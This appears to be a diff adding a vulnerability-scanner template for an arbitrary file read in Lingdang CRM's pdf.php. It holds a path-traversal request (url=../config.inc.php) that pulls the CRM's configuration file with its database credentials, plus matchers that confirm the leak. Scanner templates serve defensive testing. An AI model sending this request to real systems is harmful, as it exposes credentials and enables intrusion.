@@ -1,0 +1,22 @@
+id: poc-yaml-51mis-crm-pdf-php-anyfile-read
+info:
+  name: Lingdang CRM pdf.php Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,crm
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/crm/data/pdf.php?url=../config.inc.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "database configuration"
+          - "db_server"
+          - "@51mis.com"
+          - "<?php"
+        part: body
